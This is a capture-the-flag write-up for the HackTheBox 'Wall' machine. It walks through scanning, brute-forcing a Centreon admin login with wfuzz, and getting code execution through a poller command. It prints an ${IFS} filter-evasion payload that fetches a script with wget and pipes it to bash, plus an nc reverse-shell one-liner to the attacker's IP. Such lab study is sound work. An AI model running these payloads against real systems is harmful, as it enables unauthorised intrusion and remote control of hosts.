---
Title: HackTheBox Wall
Date: 2019-12-07
Category: Challenges
Status: published
---

Wall was as much a fun and educational box as it was frustrating and stretching my patience. It felt like the system was updated by the creator to have some features in place meant to annoy people trying to break in. Nevertheless, there are some nice WAF evasion techniques to consider here, as well as the lesson to never give up on enumeration Starting with a SYN scan, executing scripts where possible:

```sh
# nmap -sS -sC -v -oN wall.nmap 10.10.10.157

# Nmap 7.80 scan initiated Thu Dec  5 13:32:45 2019 as: nmap -sS -sC -v -oN wall.nmap 10.10.10.157
Increasing send delay for 10.10.10.157 from 0 to 5 due to 193 out of 642 dropped probes since last increase.
Nmap scan report for 10.10.10.157
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 2e:93:41:04:23:ed:30:50:8d:0d:58:23:de:7f:2c:15 (RSA)
|   256 4f:d5:d3:29:40:52:9e:62:58:36:11:06:72:85:1b:df (ECDSA)
|_  256 21:64:d0:c0:ff:1a:b4:29:0b:49:e1:11:81:b6:73:66 (ED25519)
80/tcp open  http
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec  5 13:33:04 2019 -- 1 IP address (1 host up) scanned in 18.50 seconds
```

SSH seems to support password-based login - just taking a note here. Port 80 shows the default Apache HTML page. Nothing special. Firing up Dirbuster with a medium-sized wordlist brings up some interesting results, however.

![Screenshot]({attach}screenshot-from-2019-12-05-16-58-01.png){: .image-process-article-image}

The PHP files simply return boring hardcoded strings that don't carry any meaningful information:

![Screenshot]({attach}screenshot-from-2019-12-05-15-05-55.png){: .image-process-article-image}

`/monitoring/` looks interesting however. It has HTTP basic auth enabled. If we try different HTTP verbs on this endpoint, we find the following:

```sh
# curl -X POST http://10.10.10.157/monitoring/
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 146
Content-Type: text/html
Date: Thu, 05 Dec 2019 15:56:30 GMT
ETag: "9a-58ccea50ba4c6-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Wed, 03 Jul 2019 22:47:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding

<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```

Basic authentication was only enabled for GET requests and we get a redirect page to `/centreon`, which, admittedly, was not part of my wordlist. :(

![Screenshot]({attach}screenshot-from-2019-12-05-16-57-05.png){: .image-process-article-image}

We directly see the version here, `19.04.0`. A quick Google search reveals an [authenticated remote code execution exploit](https://www.exploit-db.com/exploits/47069) is available. Noted. Now we just have to find a login. The default credentials, `admin:centreon` do not work. After having looked everywhere, losing a good two hours in the process, the only chance seems to be brute force. In the Centreon API documentation we find [a section on how to authenticate](https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication). With that, let's fire up `wfuzz` and try some common passwords, assuming the default username, admin, has been kept in place.

```sh
$ wfuzz -w ../seclists/Passwords/Common-Credentials/10k-most-common.txt -c -d "username=admin&password=FUZZ" --hc 403 '10.10.10.157/centreon/api/index.php?action=authenticate'
********************************************************
* Wfuzz 2.4.2 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.157/centreon/api/index.php?action=authenticate
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000621:   200        0 L      1 W      60 Ch       "password1"
```

That was quick. Now we can login. Checking out the functionality of Centreon, it is an application to monitor the state of hosts and manage infrastructure in general. The RCE code in the ExploitDB link above needed to be updated due to the additional sanitisation the challenge creator (who also is the exploit author!) added to the input field we need.

I'd like to show an additional exploit though, where you game the system with the functionality it already provides. As an admin you have permissions to edit pollers. A poller can have a post-generation command attached to it. This is probably used for initialisation in legitimate use cases. For us, this already carries all the RCE capabilities we need.

The input for the command to execute is sanitised and no spaces are allowed. We can easily circumvent this by referencing the [internal field separator](https://en.wikipedia.org/wiki/Internal_field_separator) variable in the shell environment we're later executing the command in. Our filled out command passing the WAF now looks like this:

![Screenshot]({attach}screenshot-from-2019-12-07-17-01-51.png){: .image-process-article-image}

For convenient copy-paste, that is:

```sh
wget${IFS}-qO-${IFS}http://10.10.14.13/legitfile${IFS}|${IFS}bash;
```

Our payload file we'll download with `wget` contains the following code:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f
```

At the same time we fire up a simple HTTP server and a netcat listener on our attacker machine. Now we head to the poller overview and edit the default one to include our new post-generation command. Then we export it's configuration. We don't even want to generate the config files here, just running the post generation command is enough. Our server and listener are already waiting.

![Screenshot]({attach}screenshot-from-2019-12-07-17-01-22.png){: .image-process-article-image}

Hitting export, we notice the post-generation command is freezing. This means we most likely got an open connection:

![Screenshot]({attach}screenshot-from-2019-12-07-17-01-01.png){: .image-process-article-image}

![Screenshot]({attach}screenshot-from-2019-12-07-17-01-10.png){: .image-process-article-image}

Our `id` is

```
uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)
```

And `/etc/passwd` shows an interesting entry where the user flag might be:

```
shelby:x:6001:6001::/home/shelby:/bin/bash
```

We don't have permissions to access the file. Using [LinEnum](https://github.com/rebootuser/LinEnum) for enumeration we stumble across some interesting versions, among them screen 4.5.0 for which we have a [local privilege escalation exploit](https://www.exploit-db.com/exploits/41154) available. From there all it took was downloading the code through the Python HTTP server, executing it, and using the root privileges to access the user and the root flag. Wow, that was a quick escalation after such a painstaking process of enumeration and getting the initial shell. But at least I have learned about `${IFS}` and some other means of bypassing filters for my future payloads.
